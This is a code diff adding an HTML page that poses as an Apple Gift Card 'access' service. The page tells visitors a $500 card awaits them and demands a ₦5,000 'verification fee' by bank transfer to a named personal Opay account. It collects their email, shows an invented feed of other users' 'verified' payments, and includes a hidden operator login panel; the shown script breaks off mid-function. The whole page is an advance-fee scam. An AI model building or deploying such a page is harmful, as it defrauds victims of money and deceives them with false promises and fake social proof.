@@ -1,0 +1,1560 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Apple Card Access - Payment Verification</title>
+  <meta name="description" content="Complete your payment verification to access your Apple Gift Card." />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root{
+      --bg:#f6f7fb;
+      --card:#fff;
+      --accent:#99244f;
+      --accent-dark:#7b0631;
+      --muted:#6b7280;
+      --success:#16a34a;
+      --pending:#f59e0b;
+      --danger:#ef4444;
+      --radius:12px;
+      --max-width:1000px;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    }
+        *{box-sizing:border-box}
+    body{
+      margin:0;
+      background:linear-gradient(180deg,#f8fafc 0%,var(--bg) 100%);
+      color:#0f172a;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      min-height:100vh;
+    }
+    .container{
+      width:100%;
+      max-width:var(--max-width);
+      margin:0 auto;
+      padding:20px;
+    }
+
+    /* Header with Apple Card Preview */
+    .card-preview-header{
+      background:linear-gradient(135deg, #00b224 0%, #002e09 100%);
+      border-radius:20px;
+      padding:40px;
+      color:white;
+      margin-bottom:30px;
+      position:relative;
+      overflow:hidden;
+      box-shadow:0 20px 40px rgba(0,0,0,0.15);
+    }
+    .card-preview-header:before{
+      content:"";
+      position:absolute;
+      top:0;
+      left:0;
+      right:0;
+      bottom:0;
+      background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><circle cx="80" cy="20" r="30"/><circle cx="20" cy="80" r="40"/></svg>');
+    }
+    .apple-logo{
+      font-size:48px;
+      margin-bottom:20px;
+      text-align:center;
+    }
+    .card-title{
+      text-align:center;
+      font-size:32px;
+      font-weight:700;
+      margin-bottom:10px;
+    }
+    .card-subtitle{
+      text-align:center;
+      opacity:0.9;
+      font-size:18px;
+      margin-bottom:30px;
+    }
+    .card-amount-display{
+      background:rgba(255,255,255,0.1);
+      backdrop-filter:blur(10px);
+      border-radius:16px;
+      padding:25px;
+      text-align:center;
+      max-width:400px;
+      margin:0 auto;
+      border:1px solid rgba(255,255,255,0.2);
+    }
+    .amount-label{
+      font-size:16px;
+      opacity:0.9;
+      margin-bottom:10px;
+    }
+    .amount-value{
+      font-size:48px;
+      font-weight:800;
+      color:#fff;
+    }
+    .currency{
+      font-size:24px;
+      opacity:0.9;
+      margin-right:-5px;
+    }
+    .fee-notice{
+      text-align:center;
+      margin-top:20px;
+      font-size:14px;
+      opacity:0.8;
+      line-height:1.6;
+    }
+
+    /* Main Content */
+    .main-content{
+      display:grid;
+      grid-template-columns: 1fr 350px;
+      gap:30px;
+    }
+
+    /* Payment Section */
+    .payment-section{
+      background:white;
+      border-radius:20px;
+      padding:30px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.05);
+      border:1px solid rgba(0,0,0,0.03);
+    }
+    .section-title{
+      font-size:20px;
+      font-weight:700;
+      margin-bottom:25px;
+      color:#111827;
+      display:flex;
+      align-items:center;
+      gap:10px;
+    }
+    .section-title i{
+      color:var(--accent);
+    }
+
+    .field{
+      margin-bottom:25px;
+    }
+    label{
+      display:block;
+      font-size:14px;
+      color:var(--muted);
+      margin-bottom:10px;
+      font-weight:500;
+    }
+
+    .payment-method{
+      background:#f8fafc;
+      border-radius:16px;
+      padding:25px;
+      margin-bottom:25px;
+      border:2px solid #e6e9ef;
+    }
+    .method-header{
+      display:flex;
+      gap:15px;
+      align-items:center;
+      margin-bottom:15px;
+    }
+    .method-icon{
+      width:50px;
+      height:50px;
+      background:var(--accent);
+      border-radius:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:white;
+      font-size:22px;
+    }
+    .method-info h4{
+      margin:0 0 5px 0;
+      font-size:18px;
+    }
+    .method-info p{
+      margin:0;
+      color:var(--muted);
+      font-size:14px;
+    }
+
+    .bank-details{
+      background:white;
+      border-radius:12px;
+      padding:20px;
+      border:1px dashed #cbd5e1;
+      margin-top:20px;
+    }
+    .bank-row{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      padding:12px 0;
+      border-bottom:1px solid #f1f5f9;
+    }
+    .bank-row:last-child{
+      border-bottom:none;
+    }
+    .bank-label{
+      color:var(--muted);
+      font-weight:500;
+    }
+    .bank-value{
+      font-weight:700;
+      color:#111827;
+      font-size:16px;
+    }
+    .copy-btn{
+      background:var(--accent);
+      color:white;
+      border:none;
+      border-radius:8px;
+      padding:8px 16px;
+      font-size:13px;
+      font-weight:600;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      gap:6px;
+      transition:all 0.2s;
+    }
+    .copy-btn:hover{
+      background:var(--accent-dark);
+    }
+    .copy-btn.copied{
+      background:#10b981;
+    }
+
+    .input-wrapper{
+      position:relative;
+    }
+    input{
+      width:100%;
+      padding:16px;
+      border-radius:12px;
+      border:1.5px solid #e6e9ef;
+      font-size:15px;
+      transition:all 0.2s;
+    }
+    input:focus{
+      outline:none;
+      border-color:var(--accent);
+      box-shadow:0 0 0 3px rgba(10,132,255,0.1);
+    }
+    .input-icon{
+      position:absolute;
+      right:16px;
+      top:50%;
+      transform:translateY(-50%);
+      color:var(--muted);
+    }
+
+    .paybtn{
+      width:100%;
+      padding:18px;
+      border-radius:14px;
+      background:linear-gradient(90deg, var(--accent) 0%, var(--accent-dark) 100%);
+      color:white;
+      font-weight:700;
+      border:0;
+      font-size:16px;
+      cursor:pointer;
+      box-shadow:0 12px 25px rgba(10,132,255,0.2);
+      transition:all 0.2s;
+      position:relative;
+      overflow:hidden;
+      margin-top:10px;
+    }
+    .paybtn:hover:not(:disabled){
+      transform:translateY(-2px);
+      box-shadow:0 18px 30px rgba(10,132,255,0.25);
+    }
+    .paybtn:disabled{
+      opacity:0.7;
+      cursor:not-allowed;
+    }
+    .btn-spinner{
+      display:none;
+      width:22px;
+      height:22px;
+      border:3px solid rgba(255,255,255,0.3);
+      border-radius:50%;
+      border-top-color:white;
+      animation:spin 1s linear infinite;
+      margin:0 auto;
+    }
+    .paybtn:disabled .btn-spinner{
+      display:block;
+    }
+    .paybtn:disabled .btn-text{
+      display:none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Sidebar */
+    .sidebar{
+      display:flex;
+      flex-direction:column;
+      gap:25px;
+    }
+
+    .info-box{
+      background:white;
+      border-radius:20px;
+      padding:25px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.05);
+      border:1px solid rgba(0,0,0,0.03);
+    }
+    .info-box h3{
+      margin:0 0 15px 0;
+      font-size:16px;
+      color:#111827;
+      display:flex;
+      align-items:center;
+      gap:10px;
+    }
+    .info-box h3 i{
+      color:var(--accent);
+    }
+    .info-item{
+      display:flex;
+      gap:12px;
+      align-items:flex-start;
+      margin-bottom:15px;
+      padding-bottom:15px;
+      border-bottom:1px solid #f1f5f9;
+    }
+    .info-item:last-child{
+      margin-bottom:0;
+      padding-bottom:0;
+      border-bottom:none;
+    }
+    .info-item i{
+      color:#10b981;
+      margin-top:3px;
+    }
+    .info-content h4{
+      margin:0 0 5px 0;
+      font-size:14px;
+    }
+    .info-content p{
+      margin:0;
+      color:var(--muted);
+      font-size:13px;
+      line-height:1.5;
+    }
+
+    .live-activity{
+      background:white;
+      border-radius:20px;
+      padding:25px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.05);
+      border:1px solid rgba(0,0,0,0.03);
+      max-height:300px;
+      overflow:hidden;
+      position:relative;
+    }
+    .live-activity:before{
+      content:"";
+      position:absolute;
+      top:0;
+      left:0;
+      right:0;
+      height:20px;
+      background:linear-gradient(to bottom, white, transparent);
+      z-index:2;
+    }
+    .live-activity:after{
+      content:"";
+      position:absolute;
+      bottom:0;
+      left:0;
+      right:0;
+      height:20px;
+      background:linear-gradient(to top, white, transparent);
+      z-index:2;
+    }
+    .activity-title{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      margin-bottom:20px;
+      font-size:16px;
+      font-weight:600;
+      color:#111827;
+    }
+    .live-indicator{
+      width:10px;
+      height:10px;
+      background:#ef4444;
+      border-radius:50%;
+      animation:pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    .activity-list{
+      height:200px;
+      overflow:hidden;
+      position:relative;
+    }
+    .activity-track{
+      animation:scrollActivity 60s linear infinite;
+    }
+    .activity-item{
+      background:#f8fafc;
+      border-radius:12px;
+      padding:15px;
+      margin-bottom:12px;
+      border-left:4px solid var(--accent);
+      animation:fadeIn 0.5s ease;
+    }
+    .activity-header{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-bottom:8px;
+    }
+    .activity-user{
+      font-weight:600;
+      color:#111827;
+      font-size:14px;
+    }
+    .activity-time{
+      font-size:12px;
+      color:var(--muted);
+    }
+    .activity-text{
+      font-size:14px;
+      color:#374151;
+      line-height:1.5;
+    }
+
+    @keyframes scrollActivity {
+      0% { transform: translateY(0); }
+      100% { transform: translateY(-100%); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Footer */
+    footer{
+      margin-top:40px;
+      text-align:center;
+      color:var(--muted);
+      font-size:14px;
+      padding-top:20px;
+      border-top:1px solid #f1f5f9;
+    }
+    footer a{
+      color:var(--accent);
+      text-decoration:none;
+    }
+    footer a:hover{
+      text-decoration:underline;
+    }
+
+    /* Modals */
+    .modal{
+      position:fixed;
+      inset:0;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      background:rgba(2,6,23,0.7);
+      z-index:1000;
+      padding:20px;
+      animation:fadeIn 0.3s ease;
+    }
+    .modal.show{display:flex}
+    .modal-card{
+      background:white;
+      border-radius:20px;
+      width:100%;
+      max-width:500px;
+      box-shadow:0 25px 60px rgba(2,6,23,0.4);
+      overflow:hidden;
+      animation:slideUp 0.4s ease;
+    }
+    .modal-header{
+      padding:25px;
+      background:linear-gradient(90deg, #00b224 0%, #1ed042 100%);
+      color:white;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+    }
+    .modal-header h3{
+      margin:0;
+      font-size:22px;
+    }
+    .close-modal{
+      background:none;
+      border:none;
+      color:white;
+      font-size:28px;
+      cursor:pointer;
+      padding:0;
+      width:36px;
+      height:36px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      border-radius:50%;
+      transition:background 0.2s;
+    }
+    .close-modal:hover{
+      background:rgba(255,255,255,0.1);
+    }
+    .modal-content{
+      padding:30px;
+      max-height:70vh;
+      overflow-y:auto;
+    }
+
+    /* Status Modal */
+    .status-content{
+      text-align:center;
+    }
+    .status-icon{
+      font-size:60px;
+      margin-bottom:20px;
+    }
+    .status-title{
+      font-size:24px;
+      font-weight:700;
+      margin-bottom:10px;
+      color:#111827;
+    }
+    .status-message{
+      color:var(--muted);
+      margin-bottom:25px;
+      line-height:1.6;
+    }
+    .status-badge{
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      padding:10px 20px;
+      border-radius:20px;
+      font-weight:600;
+      font-size:14px;
+      margin-bottom:30px;
+    }
+    .status-pending{
+      background:#fef3c7;
+      color:#92400e;
+    }
+    .status-approved{
+      background:#d1fae5;
+      color:#065f46;
+    }
+
+    .notification-box{
+      background:#f8fafc;
+      border-radius:16px;
+      padding:20px;
+      margin:25px 0;
+      border:1px solid #e6e9ef;
+      text-align:left;
+    }
+    .notification-title{
+      font-weight:600;
+      margin-bottom:10px;
+      color:#111827;
+      display:flex;
+      align-items:center;
+      gap:8px;
+    }
+    .notification-text{
+      color:var(--muted);
+      font-size:14px;
+      line-height:1.6;
+    }
+
+    .card-access-box{
+      background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      border-radius:16px;
+      padding:30px;
+      color:white;
+      margin:20px 0;
+      position:relative;
+      overflow:hidden;
+      box-shadow:0 15px 35px rgba(102,126,234,0.2);
+    }
+    .card-access-box:before{
+      content:"";
+      position:absolute;
+      top:0;
+      left:0;
+      right:0;
+      bottom:0;
+      background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><circle cx="80" cy="20" r="30"/><circle cx="20" cy="80" r="40"/></svg>');
+    }
+    .access-title{
+      font-size:20px;
+      font-weight:700;
+      margin-bottom:15px;
+      text-align:center;
+    }
+    .access-code{
+      font-family:'Courier New', monospace;
+      font-size:24px;
+      letter-spacing:3px;
+      text-align:center;
+      background:rgba(255,255,255,0.1);
+      padding:15px;
+      border-radius:10px;
+      margin:15px 0;
+      backdrop-filter:blur(10px);
+    }
+    .access-actions{
+      display:flex;
+      gap:10px;
+      margin-top:20px;
+    }
+    .access-btn{
+      flex:1;
+      background:rgba(255,255,255,0.2);
+      border:none;
+      color:white;
+      padding:12px;
+      border-radius:10px;
+      cursor:pointer;
+      font-weight:600;
+      backdrop-filter:blur(10px);
+      transition:background 0.2s;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+    }
+    .access-btn:hover{
+      background:rgba(255,255,255,0.3);
+    }
+
+    /* Support Panel (Admin) */
+    .support-panel{
+      max-width:800px;
+    }
+    .support-tabs{
+      display:flex;
+      border-bottom:1px solid #e6e9ef;
+      margin-bottom:25px;
+      flex-wrap:wrap;
+    }
+    .support-tab{
+      padding:15px 25px;
+      background:none;
+      border:none;
+      border-bottom:3px solid transparent;
+      font-weight:600;
+      color:var(--muted);
+      cursor:pointer;
+      transition:all 0.2s;
+      white-space:nowrap;
+    }
+    .support-tab.active{
+      color:var(--accent);
+      border-bottom-color:var(--accent);
+    }
+    .support-section{
+      display:none;
+    }
+    .support-section.active{
+      display:block;
+    }
+    .support-table{
+      width:100%;
+      border-collapse:collapse;
+      font-size:14px;
+    }
+    .support-table th{
+      text-align:left;
+      padding:15px;
+      background:#f8fafc;
+      border-bottom:2px solid #e6e9ef;
+      font-weight:600;
+      color:#374151;
+    }
+    .support-table td{
+      padding:15px;
+      border-bottom:1px solid #f1f5f9;
+    }
+    .action-btn{
+      padding:8px 16px;
+      border-radius:8px;
+      border:none;
+      cursor:pointer;
+      font-weight:600;
+      font-size:13px;
+      transition:all 0.2s;
+    }
+    .approve-btn{
+      background:#d1fae5;
+      color:#065f46;
+    }
+    .approve-btn:hover{
+      background:#a7f3d0;
+    }
+    .view-btn{
+      background:#dbeafe;
+      color:#1e40af;
+      margin-left:8px;
+    }
+    .view-btn:hover{
+      background:#bfdbfe;
+    }
+
+    .form-group{
+      margin-bottom:20px;
+    }
+    .form-group label{
+      display:block;
+      margin-bottom:8px;
+      font-weight:600;
+      color:#111827;
+    }
+
+    /* Loading */
+    .loading-overlay{
+      position:fixed;
+      inset:0;
+      background:rgba(255,255,255,0.9);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:2000;
+      flex-direction:column;
+      gap:20px;
+    }
+    .loading-overlay.show{display:flex}
+    .loading-spinner{
+      width:50px;
+      height:50px;
+      border:4px solid rgba(10,132,255,0.1);
+      border-radius:50%;
+      border-top-color:var(--accent);
+      animation:spin 1s linear infinite;
+    }
+
+    /* Animations */
+    @keyframes slideUp {
+      from { transform: translateY(30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    /* Secret Support Access */
+    .support-access{
+      position:fixed;
+      top:20px;
+      right:20px;
+    }
+    .support-btn{
+      background:#00b224;
+      color:white;
+      border:none;
+      padding:10px 20px;
+      border-radius:10px;
+      font-size:14px;
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      gap:8px;
+      transition:all 0.2s;
+      opacity:0.3;
+    }
+    .support-btn:hover{
+      opacity:1;
+      background:#1ed042;
+      transform:translateY(-2px);
+    }
+
+    /* Color Picker */
+    .color-picker{
+      display:flex;
+      gap:10px;
+      align-items:center;
+    }
+    .color-preview{
+      width:40px;
+      height:40px;
+      border-radius:8px;
+      border:2px solid #e6e9ef;
+      cursor:pointer;
+    }
+    .color-input{
+      flex:1;
+    }
+
+    /* Responsive */
+    @media (max-width:900px){
+      .main-content{
+        grid-template-columns:1fr;
+      }
+      .card-preview-header{
+        padding:30px 20px;
+      }
+      .amount-value{
+        font-size:36px;
+      }
+    }
+    @media (max-width:480px){
+      .container{
+        padding:15px;
+      }
+      .card-preview-header{
+        padding:25px 15px;
+      }
+      .modal-content{
+        padding:20px;
+      }
+      .access-actions{
+        flex-direction:column;
+      }
+      .support-tabs{
+        overflow-x:auto;
+      }
+    }
+    a{
+      text-decoration: none;
+    }
+  </style>
+</head>
+<script src="intelligent.js"></script>
+<body>
+  <!-- Secret Support Access Button (Hidden from normal users) -->
+    <div class="support-access">
+    <button class="support-btn" id="support-access-btn" title="Support Panel Access">
+      <i class="fas fa-life-ring"></i>
+    </button>
+  </div>
+  <a href="#ba">
+  <div class="container">
+    <!-- Apple Card Preview Header -->
+    <div class="card-preview-header">
+      <center>
+      <img src="https://upload.pinnocent.com/assets/files/upload-1768369810.png" style="width:200px;"> </center>
+      <div class="apple-logo">Apple Gift Card</div>
+      <div class="card-subtitle">Your card is ready for access</div>
+      
+      <div class="card-amount-display">
+        <div class="amount-label">Card Value</div>
+        <div class="amount-value">
+          <span class="currency">$</span>
+          <span id="card-amount">500</span>
+        </div>
+      </div>
+      
+      <div class="fee-notice">
+        Due to country verification requirements, a small access fee is required to view your gift card details.
+      </div>
+    </div>
+</a>
+    <div class="main-content">
+      <!-- Payment Section -->
+      <section class="payment-section" id="ba">
+        <h2 class="section-title">
+          <i class="fas fa-lock"></i> Complete Access Payment
+        </h2>
+
+        <div class="field">
+          <label>Access Fee Amount</label>
+          <div style="font-size:32px;font-weight:700;color:#111827;">
+            ₦<span id="fee-amount">5,000</span>
+          </div>
+          <div style="color:var(--muted);font-size:14px;margin-top:5px;">
+            One-time verification fee: Pay using the method below and enter your email to receive your gift card.
+          </div>
+        </div>
+
+        <div class="payment-method">
+          <div class="method-header">
+            <div class="method-icon">
+              <i class="fas fa-university"></i>
+            </div>
+            <div class="method-info">
+              <h4>Bank Transfer</h4>
+              <p>Transfer the access fee to complete verification</p>
+            </div>
+          </div>
+
+          <div class="bank-details">
+            <div class="bank-row">
+              <div class="bank-label">Bank Name:</div>
+              <div class="bank-value">Opay</div>
+            </div>
+            
+            <div class="bank-row">
+              <div class="bank-label">Account Number:</div>
+              <div class="bank-value" style="display:flex;align-items:center;gap:12px;">
+                <span id="account-number">6117932774</span>
+                <button class="copy-btn" id="copy-account">
+                  <i class="fas fa-copy"></i> Copy
+                </button>
+              </div>
+            </div>
+            
+            <div class="bank-row">
+              <div class="bank-label">Account Name:</div>
+              <div class="bank-value" style="display:flex;align-items:center;gap:12px;">
+                <span id="account-name">Abdulmalik</span>
+                <button class="copy-btn" id="copy-name">
+                  <i class="fas fa-copy"></i> Copy
+                </button>
+              </div>
+            </div>
+            
+            <div class="bank-row">
+              <div class="bank-label">Access Fee:</div>
+              <div class="bank-value">₦<span id="bank-amount">5,000</span></div>
+            </div>
+          </div>
+        </div>
+<form>
+        <div class="field">
+          <label for="email">Your Email Address</label>
+          <div class="input-wrapper">
+            <input id="email" type="email" placeholder="your.email@example.com" required />
+            <div class="input-icon">
+              <i class="fas fa-envelope"></i>
+            </div>
+          </div>
+          <div style="font-size:13px;color:var(--muted);margin-top:5px;">
+            Your Apple Gift Card will be sent to this email
+          </div>
+        </div>
+        <div class="field">
+          <label for="reference">Payment Reference (Optional)</label>
+          <div class="input-wrapper">
+            <input id="reference" type="text" placeholder="Transaction ID or your name" required/>
+            <div class="input-icon">
+              <i class="fas fa-receipt"></i>
+            </div>
+          </div>
+        </div>
+        <button class="paybtn">
+          <span class="btn-text">I Have Made the Transfer</span>
+          <div class="btn-spinner"></div>
+        </button>
+</form>
+        <div style="margin-top:25px;padding:20px;background:#f8fafc;border-radius:12px;">
+          <div style="font-weight:600;margin-bottom:10px;color:#111827;">
+            <i class="fas fa-info-circle" style="color:var(--accent);margin-right:8px;"></i>
+            Important Information
+          </div>
+          <div style="font-size:14px;color:var(--muted);line-height:1.6;">
+            • After transferring the access fee, click "I Have Made the Transfer"<br>
+            • Our support team will verify your payment (usually within 24 hours)<br>
+            • Once verified, you will receive your Apple Gift Card via email<br>
+            • You can always access your card from the notification email
+          </div>
+        </div>
+      </section>
+
+      <!-- Sidebar -->
+      <aside class="sidebar">
+        <div class="info-box">
+          <h3><i class="fas fa-shield-alt"></i> Secure & Verified Process</h3>
+          
+          <div class="info-item">
+            <i class="fas fa-check-circle"></i>
+            <div class="info-content">
+              <h4>Payment Verification</h4>
+              <p>All payments manually verified by our support team for security</p>
+            </div>
+          </div>
+          
+          <div class="info-item">
+            <i class="fas fa-clock"></i>
+            <div class="info-content">
+              <h4>24-Hour Access</h4>
+              <p>Gift card access granted within 24 hours after verification</p>
+            </div>
+          </div>
+          
+          <div class="info-item">
+            <i class="fas fa-envelope"></i>
+            <div class="info-content">
+              <h4>Email Delivery</h4>
+              <p>Your Apple Gift Card will be delivered securely to your email</p>
+            </div>
+          </div>
+          
+          <div class="info-item">
+            <i class="fas fa-headset"></i>
+            <div class="info-content">
+              <h4>Support Available</h4>
+              <p>Contact support if you have any questions about the process</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="live-activity">
+          <div class="activity-title">
+            <span class="live-indicator"></span>
+            <span>Recent Access Activity</span>
+          </div>
+          <div class="activity-list">
+            <div class="activity-track" id="activity-track">
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">harmayoh</div>
+                  <div class="activity-time">Just now</div>
+                </div>
+                <div class="activity-text">initiated access payment</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Support</div>
+                  <div class="activity-time">Just now</div>
+                </div>
+                <div class="activity-text">verified payment for hdt@gmail.com</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">hdt</div>
+                  <div class="activity-time">Just now</div>
+                </div>
+                <div class="activity-text">initiated access payment</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Alex</div>
+                  <div class="activity-time">2 minutes ago</div>
+                </div>
+                <div class="activity-text">completed payment verification</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Sarah</div>
+                  <div class="activity-time">15 minutes ago</div>
+                </div>
+                <div class="activity-text">accessed their Apple Gift Card</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Mike</div>
+                  <div class="activity-time">1 hour ago</div>
+                </div>
+                <div class="activity-text">payment verified by support</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Jessica</div>
+                  <div class="activity-time">3 hours ago</div>
+                </div>
+                <div class="activity-text">received Apple Card via email</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">David</div>
+                  <div class="activity-time">5 hours ago</div>
+                </div>
+                <div class="activity-text">completed access payment</div>
+              </div>
+                            <div class="activity-item">
+                <div class="activity-header">
+                  <div class="activity-user">Emma</div>
+                  <div class="activity-time">1 day ago</div>
+                </div>
+                <div class="activity-text">successfully accessed $100 Apple Card</div>
+              </div>
+                          </div>
+          </div>
+        </div>
+      </aside>
+    </div>
+
+    <footer>
+      <p>© 2026 Apple Gift Card Access System. This service helps users access their Apple Gift Cards in compliance with regional policies.</p>
+      <p style="margin-top:10px;">
+        <a href="#" onclick="event.preventDefault()">Terms of Service</a> • 
+        <a href="#" onclick="event.preventDefault()">Privacy Policy</a> • 
+        <a href="#" onclick="event.preventDefault()">Contact Support</a>
+      </p>
+    </footer>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Processing your request...</div>
+  </div>
+
+  <!-- Status Modal -->
+  <div class="modal" id="status-modal" role="dialog" aria-modal="true">
+    <div class="modal-card">
+      <div class="modal-header">
+        <h3>Payment Status</h3>
+        <button class="close-modal" id="close-status-modal" aria-label="Close">×</button>
+      </div>
+      <div class="modal-content">
+        <div class="status-content">
+          <div class="status-icon" id="status-icon">⏳</div>
+          <h3 class="status-title" id="status-title">Verification in Progress</h3>
+          <p class="status-message" id="status-message">
+            Your payment is being verified by our support team. This usually takes up to 24 hours.
+          </p>
+          
+          <div class="status-badge status-pending" id="status-badge">
+            <i class="fas fa-clock"></i> AWAITING VERIFICATION
+          </div>
+
+          <div class="notification-box" id="notification-info">
+            <div class="notification-title">
+              <i class="fas fa-bell"></i> What happens next?
+            </div>
+            <div class="notification-text">
+              Once our support team verifies your payment, you will receive an email with your Apple Gift Card details. You can access your card anytime from that email.
+            </div>
+          </div>
+
+          <div class="card-access-box" id="card-access" style="display:none;">
+            <div class="access-title">Your Apple Gift Card</div>
+            <div class="access-code" id="gift-card-code">●●●● ●●●● ●●●● ●●●●</div>
+            <div style="text-align:center;font-size:14px;opacity:0.9;margin-bottom:15px;">
+              Value: $<span id="gift-card-amount">500</span>
+            </div>
+            <div class="access-actions">
+              <button class="access-btn" id="view-card-btn">
+                <i class="fas fa-eye"></i> View Card
+              </button>
+              <button class="access-btn" id="copy-card-btn">
+                <i class="fas fa-copy"></i> Copy Code
+              </button>
+              <button class="access-btn" id="save-card-btn">
+                <i class="fas fa-download"></i> Save Card
+              </button>
+            </div>
+          </div>
+
+          <button class="paybtn" id="close-status-btn" style="background:#00b224;">
+            Close
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+  <!-- Support Panel Modal (Login) -->
+  <div class="modal" id="support-modal" role="dialog" aria-modal="true">
+    <div class="modal-card support-panel">
+      <div class="modal-header">
+        <h3>Support Panel</h3>
+        <button class="close-modal" id="close-support-modal" aria-label="Close">×</button>
+      </div>
+      <div class="modal-content">
+        <div id="support-login" style="display:block;">
+          <h4 style="margin-bottom:20px;">Support Team Login</h4>
+          <div class="form-group">
+            <label for="support-password">Password</label>
+            <input type="password" id="support-password" placeholder="Enter support password" style="width:100%;">
+          </div>
+          <button class="paybtn" id="support-login-btn">
+            Login to Support Panel
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Global variables
+    let currentPaymentId = null;
+
+    // DOM Elements
+    const supportAccessBtn = document.getElementById('support-access-btn');
+    const supportModal = document.getElementById('support-modal');
+    const supportLoginBtn = document.getElementById('support-login-btn');
+    const supportPasswordInput = document.getElementById('support-password');
+    const closeSupportModal = document.getElementById('close-support-modal');
+
+    const statusModal = document.getElementById('status-modal');
+    const closeStatusModal = document.getElementById('close-status-modal');
+    const closeStatusBtn = document.getElementById('close-status-btn');
+    const statusIcon = document.getElementById('status-icon');
+    const statusTitle = document.getElementById('status-title');
+    const statusMessage = document.getElementById('status-message');
+    const statusBadge = document.getElementById('status-badge');
+    const notificationInfo = document.getElementById('notification-info');
+    const cardAccess = document.getElementById('card-access');
+    const giftCardCode = document.getElementById('gift-card-code');
+    const giftCardAmount = document.getElementById('gift-card-amount');
+    const viewCardBtn = document.getElementById('view-card-btn');
+    const copyCardBtn = document.getElementById('copy-card-btn');
+    const saveCardBtn = document.getElementById('save-card-btn');
+
+    const payBtn = document.getElementById('pay-now');
+    const emailInput = document.getElementById('email');
+    const referenceInput = document.getElementById('reference');
+    const copyAccountBtn = document.getElementById('copy-account');
+    const copyNameBtn = document.getElementById('copy-name');
+
+    const loadingOverlay = document.getElementById('loading-overlay');
+    const yearElement = document.getElementById('year');
+
+    // Admin elements
+    const saveSettingsBtn = document.getElementById('save-settings-btn');
+    const supportTabs = document.querySelectorAll('.support-tab');
+    const supportSections = document.querySelectorAll('.support-section');
+    const primaryColorInput = document.getElementById('primary-color-input');
+    const secondaryColorInput = document.getElementById('secondary-color-input');
+    const primaryColorPreview = document.getElementById('primary-color-preview');
+    const secondaryColorPreview = document.getElementById('secondary-color-preview');
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+      yearElement.textContent = new Date().getFullYear();
+      
+      // Setup color pickers
+      if (primaryColorInput) {
+        primaryColorInput.addEventListener('input', (e) => {
+          primaryColorPreview.style.background = e.target.value;
+        });
+        
+        secondaryColorInput.addEventListener('input', (e) => {
+          secondaryColorPreview.style.background = e.target.value;
+        });
+      }
+    });
+
+    // Support Panel
+    if (supportAccessBtn) {
+      supportAccessBtn.addEventListener('click', () => {
+        supportModal.classList.add('show');
+      });
+    }
+
+    if (closeSupportModal) {
+      closeSupportModal.addEventListener('click', () => {
+        supportModal.classList.remove('show');
+      });
+    }
+
+    if (supportLoginBtn) {
+      supportLoginBtn.addEventListener('click', async () => {
+        const password = supportPasswordInput.value;
+        
+        const response = await fetch('', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          },
+          body: `action=admin_login&password=${encodeURIComponent(password)}`
+        });
+        
+        const result = await response.json();
+        if (result.success) {
+          window.location.reload();
+        } else {
+          alert(result.message || 'Login failed');
+        }
+      });
+    }
+
+    // Admin tabs
+    if (supportTabs.length > 0) {
+      supportTabs.forEach(tab => {
+        tab.addEventListener('click', () => {
+          const tabId = tab.getAttribute('data-tab');
+          
+          // Update active tab
+          supportTabs.forEach(t => t.classList.remove('active'));
+          tab.classList.add('active');
+          
+          // Show corresponding section
+          supportSections.forEach(section => {
+            section.classList.remove('active');
+            if (section.id === tabId + '-section') {
+              section.classList.add('active');
+            }
+          });
+        });
+      });
+    }
+
+    // Save settings
+    if (saveSettingsBtn) {
+      saveSettingsBtn.addEventListener('click', async () => {
+        const settings = {
